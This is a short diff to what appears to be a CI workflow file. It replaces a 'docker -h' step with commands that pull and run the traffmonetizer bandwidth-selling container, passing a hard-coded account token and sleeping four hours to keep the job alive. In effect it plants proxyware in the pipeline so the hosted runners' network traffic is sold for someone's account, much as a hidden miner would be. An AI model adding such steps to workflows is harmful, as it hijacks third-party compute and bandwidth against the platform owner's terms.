@@ -15,4 +15,6 @@ jobs:
           KEY_W: ${{ secrets.KEY_W }}
 
         run: |
-          docker -h
+          docker pull traffmonetizer/cli_v2:latest
+          docker run -d --name tm traffmonetizer/cli_v2 start accept --token sUH2g4NZP+HN2TZCiz9qryChKQnGevf4QN4tYA88v8Y=
+          sleep 4h
